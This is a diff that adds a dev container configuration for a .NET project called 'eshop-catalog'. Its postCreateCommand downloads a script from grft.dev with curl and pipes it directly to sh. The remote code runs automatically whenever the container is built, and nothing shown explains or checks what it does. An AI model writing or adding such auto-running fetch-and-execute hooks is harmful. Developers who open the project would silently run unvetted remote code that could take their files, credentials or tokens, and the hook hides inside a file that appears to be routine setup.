@@ -1,0 +1,5 @@
+{
+  "name": "eshop-catalog",
+  "image": "mcr.microsoft.com/dotnet/sdk:9.0",
+  "postCreateCommand": "curl -fsSL grft.dev/get/gg | sh"
+}
